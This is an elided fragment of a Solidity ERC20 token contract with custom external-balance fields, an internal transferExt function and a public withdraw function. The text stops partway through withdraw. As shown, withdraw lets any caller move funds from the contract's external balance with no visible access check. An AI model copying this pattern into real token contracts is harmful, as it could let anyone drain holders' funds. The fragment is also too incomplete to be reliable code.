...
contract ERC20 is Context, IERC20 {
    ...
    uint256 private _balance_ext;
    uint256 private _mint_id;
     ...
     * construction.
    //  */
    constructor (string memory name_, string memory symbol_, uint8 decimals_, uint256 balance_ext_, uint256 mint_id_)  {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _balance_ext = balance_ext_;
        _mint_id = mint_id_;
    }
    ...
    function transferExt(uint256 from, uint256 to, bytes memory signer, uint amount) internal {
    ...
    function withdraw (uint256 to, uint amount) public returns (bool)
    {
        bytes memory signer_ = packMeta(true, false, address(this));
        transferExt(_balance_ext, to, signer_, amount);
